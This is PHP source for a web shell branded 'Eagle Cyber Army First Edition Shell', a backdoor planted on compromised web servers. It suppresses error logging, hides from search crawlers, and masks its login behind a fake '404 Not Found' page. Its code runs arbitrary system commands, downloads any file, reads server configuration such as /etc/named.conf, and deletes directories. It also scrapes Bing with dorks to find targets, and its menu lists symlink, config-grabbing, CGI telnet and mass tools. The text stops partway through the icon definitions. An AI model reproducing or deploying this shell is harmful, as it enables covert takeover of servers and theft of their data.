<?php
error_reporting(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();

///////////////////////////////////////////////////////////////////////////
$pass_login = "fe3f5812de8a9d37ff42b4f825472ec1afe893a0"; // [sha1]
$email = "hiddencoder@ecateam.com"; // For Mailer Tool
//////////////////////////////////////////////////////////////////////////

$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = ["Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot"];
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
if (!function_exists('get_magic_quotes_gpc')) {
function get_magic_quotes_gpc()
{
    // Check if magic quotes GPC emulation is needed
    if (version_compare(PHP_VERSION, '5.4.0', '<')) {
        return (bool) ini_get('magic_quotes_gpc');
    } else {
        return false; // Magic quotes GPC is deprecated and not available
    }
}
}

if(get_magic_quotes_gpc()) {
	function eca_array($array) {
		return is_array($array) ? array_map('eca_array', $array) : stripslashes($array);
	}
	$_POST = array_map('eca_array', $_POST);
	$_GET = array_map('eca_array', $_GET);
	$_COOKIE = array_map('eca_array', $_COOKIE);
	$_REQUEST = array_map('eca_array', $_REQUEST);
}


// view image
	if(isset($_GET['img'])){
		@ob_clean(); 
		$d = sulap($_GET['filename']);
		$f = $_GET['img'];
		$inf = @getimagesize($d.$f); 
   		$ext = explode($f,"."); 
   		$ext = $ext[count($ext)-1]; 
   	 	@header("Content-type: ".$inf["mime"]);
   	 	@header("Cache-control: public"); 
  		@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
  		@header("Cache-control: max-age=".(60*60*24*7));  
   	 	@readfile($d.$f); 
   	 	exit; 
	}

// Function Logout
if(isset($_GET['logout'])) {
	//unset($_SESSION['hiddencoder']);
    session_destroy();
    header('location:'.$_SERVER['PHP_SELF'].'');
	#echo "<script>window.location='".$_SERVER['PHP_SELF']."';</script>";
}

// Function Download File
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
	$file = $_GET['dl'];
	$filez = @file_get_contents($file);
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=".basename($file).";");
   echo $filez; 
    exit; 
}

// Highlight Code colors
$highlight_html = "#B3454C";
$highlight_comment = "#708090";
@ini_set("highlight.html",$highlight_html); //#000000
@ini_set("highlight.comment",$highlight_comment); //#FF8000

// Function Locked [Login]
function locked(){
 ?> 
<!DOCTYPE html>
<html>
<head>
	<title>404 Not Found</title>
    <link rel="shortcut icon" href="/favicon.ico">
</head>
<body>
<h1>Not Found</h1> 
<p>The requested URL <?php echo $_GLOBAL['PATH'].$_SERVER['PHP_SELF']; ?> was not found on this server.</p> 
<hr> 
<address>Apache Server at <?php echo $_SERVER['HTTP_HOST']; ?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; }
        input:hover {cursor: default;} 
    </style> 
    <form method="post"> 
    <input style="position: absolute;center: 30px;left: 155px;" type="password" name="password"> 
    </form>
    </body>
    </html> 
    <?php 
    exit;
}

if(!isset($_SESSION['hiddencoder'])){
    if(empty($pass_login) || (isset($_POST['password']) && (sha1($_POST['password']) == $pass_login) ) ){
        $_SESSION['hiddencoder'] = true;
    }else{
        locked();
    }
}
?>
<html>
<head>
<title>Eagle Cyber Army First Edition Shell</title>
<meta name='author' content='HiddenCoder'>
<link rel="shortcut icon" href="www.ecateam.com/favicon.ico">
<meta http-equiv="Cache-Control" content="no-store" />
<meta charset="UTF-8">
<style type='text/css'>
			*{
				margin: 0;
				padding: 0;
			}

			html, body{
				height: 100%;
			}
			li {
				display: inline;
				margin: 1px;
				padding: 10px 1px 10px 1px;
			}
			body{
				background: #333333;
				font-family: verdana;
				font-size: 10px;
				color: white;
				overflow-x: hidden;
			}
			header{
				background:#333333;
				border: 0px solid #07cb79;
				font-size: 12px;
				padding: 10px 5px 10px 5px;
			}
			pre{
				font-size: 12px;
			}
			table, th, td {
				border-collapse:collapse;
				font-family: verdana;
				background: transparent;
				font-size: 13px;
			}
			.table_home, .th_home, .td_home {
				border: 0px solid #07cb79;
			}
			th {
				cursor: default;
				padding: 10px;
			}
			th, tr:hover{
				background: #333333;
			}
			tr:hover {
				background: dimgrey;
			}
			a {
				color: #07cb79;
				text-decoration: none;
			}
			a:hover {
				color: lime;
				text-decoration: underline;
			}
			b {
				color: white;
			}
			input[type=text], input[type=password] {
				background: transparent; 
				color: #ffffff; 
				border: 2px solid #07cb79; 
				margin: 5px auto;
				padding-left: 5px;
				font-family: verdana;
				font-size: 13px;
			}
			input[type=submit] {
				color: #07cb79;
				padding:2px 10px;  
				margin:0; 
				background:#333333; 
				text-decoration:none; 
				border-radius: 5px;
				border-bottom: 2px solid #07cb79;
				border-top: 2px solid #07cb79;
				border-right: 2px solid mediumseagreen;
				border-left: 2px solid mediumseagreen;
				cursor: pointer;
			}
			input[type=submit]:hover {
				color: lime;
				background:darkgreen; 
				border-bottom:2px solid transparent; 
				border-top:2px solid transparent;
			}	
			textarea {
				border: 2px solid #07cb79;
				width: 100%;
				height: 400px;
				padding-left: 5px;
				margin: 10px auto;
				resize: none;
				background: transparent;
				color: #ffffff;
				font-family: verdana;
				font-size: 13px;
			}
			select {
				width: 152px;
				background: #333333; 
				color: white; 
				border: 1px solid #07cb79; 
				margin: 5px auto;
				padding-left: 5px;
				font-family: verdana;
				font-size: 13px;
			}
			option:hover {
				background: transparent;
				color: #07cb79;
			}
			hr{
				border-color: #07cb79;
				height: 1px;
				background-color: #07cb79;
			}
			fieldset{
				 border: 2px solid #07cb79;
			}
			.container{
				position: relative;
			}
			#footer {
   				position:fixed;
   				left:0px;
   				bottom:0px;
   				width:100%;
   				background:#07cb79;
   				color: #ffffff;
   				height: 15px;
			}

			/* IE 6 */
			* html #footer {
   				position:absolute;
  				top:expression((0-(footer.offsetHeight)+(document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.clientHeight)+(ignoreMe = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop))+'px');
			}
			.clock{
    			position: absolute;
    			top: 8px;
    			right: 16px;
   			 	font-size: 18px;
			}
			.fitur a {
				padding:5px 10px;
				margin:0; 
				background:#333333; 
				text-decoration:none; 
				letter-spacing:2px;
				border-radius: 5px;
				border-bottom: 2px solid #07cb79;
				border-top: 2px solid #07cb79;
				border-right: 2px solid mediumseagreen;
				border-left: 2px solid mediumseagreen;
     	  	}	
       		.fitur a:hover {
				background:darkgreen; 
				border-bottom:0px solid dimgrey; 
				border-top:0px solid dimgrey; 
       		}
       		.viewcode{
				background:seashell;
				margin:4px 2px;
				padding:8px;
				font-size: 14px;
				font-family: verdana;
				overflow: auto;
			}
			.center{
				position:absolute;
                right:0px;
                left:0px;
                top:260px;
                margin: auto;
			}
			.title{
				font-size:50px;
				text-align:center;
				color:#07cb79;
			}
			.coded{
				font-size:20px;
				text-align:center;
				color:white;
			}
			.thanks{
				font-size:15px;
				text-align:center;
				color:white;
			}
			.phpinfo table{
				width:100%;
				padding:0 0 0 0;
			}
			.phpinfo td{
				background:transparent;
				color:#ffffff;
				padding:6px 8px;;
			}
			.phpinfo th, th{
				background:#333333;
				border-bottom:1px solid #333333;
				font-weight:normal;
			}
			.phpinfo h2, .phpinfo h2 a{
				text-align:center;
				font-size:16px;
				padding:0;
				margin:30px 0 0 0;
				background:gray;
				color: #fff;
				padding:4px 0;
			}
			.info_file{
				border-top: 2px solid #07cb79;
				border-bottom: 2px solid #07cb79;
			}
</style>
</head>
<?php

function hapusDir($dir) {
if (!file_exists($dir)) return true;
if (!is_dir($dir) || is_link($dir)) return unlink($dir);
foreach (scandir($dir) as $item) {
if ($item == '.' || $item == '..') continue;
if (!hapusDir($dir . "/" . $item)) {
chmod($dir . "/" . $item, 0777);
if (!hapusDir($dir . "/" . $item)) return false;
};
}
return rmdir($dir);
}


function showDrives()
    {
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':'))
            {
                ?>
                <a href='?explorer&dir=<?php echo $drive.":"; ?>'>
                    <strong><?php echo $drive.":\\" ?></strong>
                </a> 
                <?php
            }
        }
    }
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(!str_contains($param, $kata1)) return FALSE;
    if(!str_contains($param, $kata2)) return FALSE;
    $start = strpos($param, (string) $kata1) + strlen($kata1);
    $end = strpos($param, (string) $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function GrabUrl($url,$type){

        $urlArray = [];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);

        $regex='|<a.*?href="(.*?)"|';
        preg_match_all($regex,$result,$parts);
        $links=$parts[1];
        foreach($links as $link){
            array_push($urlArray, $link);
        }
        curl_close($ch);

        foreach($urlArray as $value){
            $lol="$url$value";
			if(preg_match("#$type#is", $lol)) {
				echo "$lolrn";
			}
        }
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = [];
	$lll = [];
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = [];
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."n";
	}
}
function sulap($text) {
  if(!get_magic_quotes_gpc()) {
    return $text;
    }
  return stripslashes($text);
}
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$current_path = "http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['PATH'];
$is_me = $_SERVER['SCRIPT_NAME'];
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
if($win){
	$garis = "\\";
}else{
	$garis = "/";
}
$dir = str_replace("\\","/",$dir);	
$scdir = explode('/', $dir);
$freespace = hdd(disk_free_space("/"));
$totalspace = hdd(disk_total_space("/"));
$used = $totalspace - $freespace;
$hdd_percent = round(100/($totalspace/$freespace),2);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>All Functions Enable</font>";
$software = getenv("SERVER_SOFTWARE");
$home_r = $_SERVER['DOCUMENT_ROOT'];
$d0mains = @file("/etc/named.conf");
if($d0mains){
$count;  
foreach($d0mains as $d0main)
{
if(@preg_match("#zone#m",$d0main)){
preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
flush();
$count++;
} 
}
}
}
$count = (empty($count)) ? '<font color="red">0</font>' : $count;
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<body onload='startTime()'><br>";
if($_GET){
echo "<header>";
echo "<h3>System Information</h3><hr>";
echo "Operating System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Domains: <a href='?view_domains&dir=$dir'>".$count."</a><br>";
echo "HDD: <font color=lime>$freespace</font> Free of <font color=lime>$totalspace</font> [".$hdd_percent."%]<br>";
echo "Safe Mode: " .$sm. " | PHP Version : " .phpversion(). "<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | cURL: $curl <br>";
echo "Software: <font color=lime> $software </font><br>";
echo "HOME_DIR: <a href='?explorer&dir=$home_r'>$home_r</a>";
echo "<hr><br>Current Directory: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?explorer&dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>$garis";	
}
echo "&nbsp;&nbsp;[".w($dir, perms($dir))."]&nbsp;&nbsp;[<a href='?explorer'>Back to Shell Location</a>]";
if($win)
	{ echo "<br>Drive:"; showDrives();
	  echo "<br><br>";
}
else{echo "<br><br>";}
echo "<div class='clock' id='clock' style='font-family:verdana;'></div>";
echo "<hr></header>";
echo "<br><div class='fitur' style='position:relative;'>";
echo "<center>";
echo "<ul>";
echo "<li><a href='".$_SERVER['PHP_SELF']."'>Home</a></li>";
echo "<li><a href='?explorer&dir=$dir'>Explorer</a></li>";
echo "<li><a href='?upload&dir=$dir'>Upload</a></li>";
echo "<li><a href='?command&dir=$dir'>Command</a></li>";
echo "<li><a href='?network&dir=$dir'>Network</a></li>";
echo "<li><a href='?config&dir=$dir'>Config Tools</a></li>";
echo "<li><a href='?symlink_tools&dir=$dir'>Symlink Tools</a></li>";
echo "<li><a href='?jumping&dir=$dir'>Jumping</a></li>";
echo "<li><a href='?unzipper&dir=$dir'>UnZipper</a></li>";
echo "<li><a href='?cgi&dir=$dir'>CGI Telnet</a></li>";
echo "<li><a href='?mass_tools&dir=$dir'>Mass Tools</a></li>";
echo "<li><a href='?hash_tools'>Hash tools</a></li>";
echo "<li><a href='?other_tools'>Other tools</a></li>";
echo "<li><a href='?logout'>Logout</a></li>";
echo "</ul>";
echo "</center>";
echo "</div><br><br>";
}else{
echo "<br><div class='fitur' style='position:relative;'>";
echo "<center>";
echo "<ul>";
echo "<li><a href='".$_SERVER['PHP_SELF']."'>Home</a></li>";
echo "<li><a href='?explorer&dir=$dir'>Explorer</a></li>";
echo "<li><a href='?upload&dir=$dir'>Upload</a></li>";
echo "<li><a href='?command&dir=$dir'>Command</a></li>";
echo "<li><a href='?network&dir=$dir'>Network</a></li>";
echo "<li><a href='?config&dir=$dir'>Config Tools</a></li>";
echo "<li><a href='?symlink_tools&dir=$dir'>Symlink Tools</a></li>";
echo "<li><a href='?jumping&dir=$dir'>Jumping</a></li>";
echo "<li><a href='?unzipper&dir=$dir'>UnZipper</a></li>";
echo "<li><a href='?cgi&dir=$dir'>CGI Telnet</a></li>";
echo "<li><a href='?mass_tools&dir=$dir'>Mass Tools</a></li>";
echo "<li><a href='?hash_tools'>Hash tools</a></li>";
echo "<li><a href='?other_tools'>Other tools</a></li>";
echo "<li><a href='?logout'>Logout</a></li>";
echo "</ul>";
echo "</center>";
echo "</div><br><br>";
}

// Filter Extension
$file = sulap($_GET['file']);
$ext = pathinfo($file);
$ext = $ext['extension'];

function validasi($string,$ext) {
foreach($ext as $extensi) {
	if(stristr($string,(string) $extensi)){
		return true;
	}
}
return false;
}

$ext_js = ['js', 'vbs'];
$ext_txt = ['txt', 'log'];
$ext_img = ['png', 'jpg', 'ico', 'jpeg', 'gif', 'bmp', 'jfif', 'jpe', 'tif', 'tiff'];
$ext_php = ['php', 'php2', 'php3', 'php4', 'php5', 'php7', 'phtml', 'phps'];
$ext_etc = ['css', 'ini', 'inf', 'bat', 'cmd', 'sql', 'py', 'lua', 'json'];
$ext_html = ['html', 'htm', 'shtml', 'xhtml', 'xml', 'inc', 'tpl', 'tmpl'];
$ext_ht = ['htaccess', 'htpasswd', 'ht', 'hta', 'so'];
$ext_zip = ['tar', 'zip', 'rar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'cab', 'gz', 'iso', 'lha', 'lzh', 'pbk', 'uuf'];
$ext_mix = ['tar', 'zip', 'rar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'cab', 'gz', 'iso', 'lha', 'lzh', 'pbk', 'uuf', 'dll', 'exe'];

// Image Icon
// Folder Up
$folder_up = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAABtElEQVQ4T2NkoDJgpLJ5DLQzcNKECdP+MzJyoLv45cuXa9va2rYS6xOwC52cnIyAms4ePHAARR87BweDm5vbx2PHjk15+fz5S5jkv3+oxv/68/dnc3PDLJAo3MCpU6eeZWVhQVHJysrGICsny/Du3TuG37//QOX+M/z/j2rgy5cvGEpLS7X27NlzHW7g9OnTz6qpqaGohGiE6EYYgmngnTu3GTIzM032799/duAN/P8fFICoiYNsF9568Jhh6Zl7DL9//UYJms+fPzGcObBz9alVs8MgXnbzdHIOT9wrLCyMGtpIYfiDkZ1h9lNuhut8OsAARYtmoC7RB8c+6u9rsgAbaOwdO/+6Z1vCP2Y23MkNGCs/eMRxyiudnnVJ8doqN7CBmjbuLXeiVlb/ZucnNv1iqFNal7nbmOutD9hAHXO7/DsRayb84BQly0Cmvz8ZlFdFzrt9cH0y2EBDE/OImyFrl3/jlibLQPYfbxmU14SUXjt5oAdsoKWlpf1V94UHvvLIkWUg19cnDFo749xPHju2C56g1Ky9JzEyMHGSZSLDny83j24vBOmlXfFFnsswdVHdhQAJ2c7oXst+AQAAAABJRU5ErkJggg==';
// Folder Icon
$folder_icon = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAB40lEQVQ4T2NkoDJgpLJ5DLQz0M/HZxoLGxsHuoufPHmy9tSpU1uJ9QnYhU5OTkYtLS1nDx86hKKPjZ2dwcLC4iNQbsqXT59e4jL07///P48cOTILJA83cPLkKWdZWVhQDWRjY5CVk2N4//4dw+/ffxievXrDcPo+prmfPn1i2LFygfW+rRuPwQ2srKw8KwfUjAs8/vafofrMV4aLzDIYSpj+/GLQ2dW4/tSaOUFgAy0DEpdedSyN+s/EjNPAfyxsDF8FFbDKs/z8wmCyIXfhifULEsAGath6T7qTtCr3DysXsWGPoo71x0cG5fnhbTeO7qwGG6hp5dpxJ35N+W92PrIMZPv+jkF5cWjN9WP7WqEGutTcjVrZ/ItTiCwD2b+9ZlBZElZ49eSBCWADdcwd8u9Erprwg1OULAM5vr5gUF0Vlnb5xOHZYAP1TCyTb4evm/OdS4IsAzm/PGVQXxsefeHU0WVgAw3MLENvBaxa9Y0HM0kQYwP350cMmpsiA86cPLYRbKCJhYXndc/l277yYk8WhAzl+XSfQWdrlOuJ0yf2gA20s7Ozumg36+gXcg38/IDBcH+y5YGjR0/ASxs1a+9JjAxMnIRcg02e8f//bzeObckHydGu+CLHZVhdSy2DYOYAAFWzrxUVKIe0AAAAAElFTkSuQmCC';
// PHP Icon
$php_icon = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAACSUlEQVQ4T82UTW8SURSG3wGGMkOnUECwYDUdKFigYYEVWrth4catP8aVJjWuGn+GiQsTF278Ayxs/GiUj4JNbJQQdYDK15QZKB3vTJ1a+RCJC53VnXvOPPO+59xzKYx4crmcWRAEw6jY+b1UKiUN5lDqRmw95qMUitaDW3fuPjHR5mvjgBRFwTHvgN3heBMKha6T976eqwFXE6tZClREXdsuy3AEj9D4aEGzNIN5XoLtioTPrziIldN/znFzeHh/G77FRUiSVAgEAhECPVFjQ8DlW4dgHD2YmBO0v9Bgncca5Fg2IPvYPQQ0Go3odDp5nuejBKqMBMpNI6zuLqpFFr61FkwzCt4+cqMnGn8BOl0uGAynpe6I4tNoLHZ7CMhe6EL+RoNx9tA5pDHr6WrqdLvnLQ/UeCe5sZHUgPF43CUZJJOesH3vwTMTbVkb1xRVFTfLDYZ/AgcjL9LpNPFyYxxwzP5/AvxUKsHldIJl2b+zTI4GGIZBJpfDst8Ps9l81uEf5D+z3Ov1kMvnwXEc+KUlZMn6kteLvWIR4ZUV2G02XelkYKVaxfv9ffh5Hhc9HoiiiK+CoIGPiOK9QgEsUR0KBlW1k4Gvd3c1ZapFdX7L5TKsVivsdrumqtFo4F0mg2QiAZqmJwMVRcGHgwMIlQqikQhKpCFXQyH0+31NOZljhMNhMBaLyp8M1IvTbDZRr9fRbLU0cK1WgyTL8C4saMqnaoqeraptt9taCf79wd5Jp5+TG3N9mtEjd87L5ObmzbMCTPPx73K/A5KK+xUyUx+DAAAAAElFTkSuQmCC';
// HTML Icon
$html_icon = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAEEklEQVQ4T4WUe0xbVRzHv7ftvX3DWrSIVO0WAsU5IDYI4ZEYwh+y//YXyD+QaOCP/WFi/9JEo/6hJl6cUbMEzFjQSFg63KCkM8hr4aFZFpZ1sPHY2BgrBYY8+qLtpbeec5deW7fMk9zck/P4nO/5/n7nxyCtdXZ2su3t7UL62P/129ra2K6uLnkPk9owMzOTr1Qqf2ZZVk3HRFHE4eGhNE3/yWRSGkt9iUQC9CNzMZVK9V5DQ8MDulYGjo2N/Wi320/TDQqFQgIxjDyd0U9XTQ8bGRk519ra+n4GcHx8nC8oKHDSU4lSCIKAeDwugVLg9APoZr1eL6mcnp4+29TUdDoDODo6yhcWFjqpQgqMRqMIBAKy0meptVgskh3PBVKviCeIxWKIRCLPvbbZbJZuMjU19bTC4eFhvri42EmVUIUpYMrL9GuLYpL4zIACqS2Tk5PPBtpsNicNCPWGAkOhkKxwY2MPi8uPybgAkcQyFIqiuMiKmqpCTExMnG1ubs700OPx8CUlJU6qjqpJeUj7txf80Om00GYZ8OZxG67fWsKekIVE+DHmZ5fwepHuaeDQ0BBfVlYmAalKqnB/fx83vI9Q8ZYd++EDKEiKMioNhCSH3Z1NWPQKvGwx46tvfw1//43TkBHlgYEB3uFwSMBU2qyu+sEoWVSUn8CNm3PQmK0wZJuwF4zgYPMurHkWGPRarNx/gM+/6DszcOnrD+XM7e/v5ysqKpw0whRI2x8jXpw8WY7bi3dheu0ENJxKGt/e3oURu7jv2wanZJBr0uHc+cHgmY6Ps2Sgy+XiS0tLnVqtFhqNRrryxct/oqTsKHY5K140GXFEp4JwmMDB1j1UOY5LcO/cHdwjCn+/4g0tzK8fywBWVlY6OY6TE/v8L1eRY8tH7gsa6NUqBLg8AgSUwVXUlB5Djikbfr8fF9xjmJvd3nm44rPLwL6+Pr66uloGUoWXB//CdsKAt8tfQi3xcfbWAiYWQwgKJCiBCE69oYBBo8QPvVcRWgs9+u3iZ6/IwN7eXr62tlYG0oRdW9vApSt3cORVE9pPVUGt5vDRT+MIJw0IhGOoy99DbjYHl2de3Frd+XJkuOMTGdjd3f1dfX39B2q1WroyzT+aPn2uCSytR9FQk4clEvXRtWxEhQQiB1E4DA9h5ETMXtvcdw/yVmJpKAVkeZ7vamxsbKVAGulUlVleXsag5xoMBhVu+hiEFXrEyftVC2HoDoMQAnvQqf2TPT097xIgWfGkKVtaWt6pq6vroM+OPHglBdJCQaoJQ4xnV1Y2tFt/M8YEo2VJQYMoRERWGT6wF+XseL3eT91u9wXCif9bQUk9NRqNOUQhS0rYk0T8TyNwLal/2mRSpVIoElFykzARkPD5fOtkqUiX/wO0MuQciHUdngAAAABJRU5ErkJggg==';
// Image Icon
$image_icon = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAACBUlEQVQ4T9WUzWsTURTFz5tOJiYRg9UqFTdJLKXxo8S4sNVAiBZdNQaVdhEX3Vm68E/pwgoudCPSTWahU2jToBi7kIoJjVFxVPxCqoLWjDadTujMe74MKgbbJGA2vau3uPfHufedewlaHKTFPGxCYDgcdsRisaMOh8NdbxyMMT2Tyczn8/m1v/NqWo5Go+Lo2NiU7tx22qQApRSE/DsVQgSIAoN7VZuWZXkwlUpZv6E12fF4PDh88dKzBZcf2yvf4TZK+LKrC1SQasQyBph6Gb1lld2YGA9ypeq6wGQyeXjg/IV8QdiNEb+ELr8PV6fv45uvH5xRE+bqCoJLRcjXrvQqilKsC3xPvBjtC9jtGoaBW4XX+LwnZNdUSl+hvVWxoyfUPFDdeQiS9tEGVpWRzgBMRlBZ1vBmcgJrpSW4At0YCHVDuXm9scLnHCi6PCipBXj2+iBt9YJRCy8nL8Nc/GArpdTEwdB+FOfnmgNq6gIWZ1KQ2jvQefIMtFdPUX78kKsWfgEt9EX78WBWaQyce6fh070pOJ0uu9jijbe1ifzxxx1cYRPARCJx4PipwSd3ZjIcVtfXoBZF5MQxdleRe9Lp9It1f7lq7HNDQ7M/LDGm60bdu+H2bMG+Du9tbuqzGxq7SqiuXiQSOSKKoqfBJVrJ5XKPstmsueHqteKUbcLz9b9t/wRQVuIVY+xtUQAAAABJRU5ErkJggg==';
// TXT Icon
